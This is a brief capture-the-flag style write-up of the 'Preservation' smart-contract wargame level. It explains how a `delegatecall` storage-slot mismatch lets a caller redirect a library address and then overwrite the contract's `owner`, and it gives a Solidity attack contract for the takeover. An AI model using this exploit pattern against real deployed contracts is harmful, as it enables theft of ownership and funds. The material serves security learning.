### Level 16: Preservation

-   **Date:** 05-05-2026
-   **Difficulty:** Easy

* * * * *

#### Thinking

-   First, I understood the objective with some help: I needed to change the `owner` state variable.
-   The key concept used here is `delegatecall`.
-   `LibraryContract` defines `storedTime` at slot 0, while in `Preservation` it is at slot 2. So the library call ends up modifying the value of `timeZone1Library` instead.
-   If we somehow set our attacker contract address into `timeZone1Library`, we can then update slot 2 directly, since `setFirstTime` uses a `delegatecall`.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    address public testAddress;  // slot 0
    address public testAddress2; // slot 1
    address public owner;        // slot 2

    constructor(address _owner) {
        owner = _owner;
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

```

* * * * *

#### Learning

-   Learned how to write a Foundry automation script for deployment and use `cast` commands to quickly read state variable values.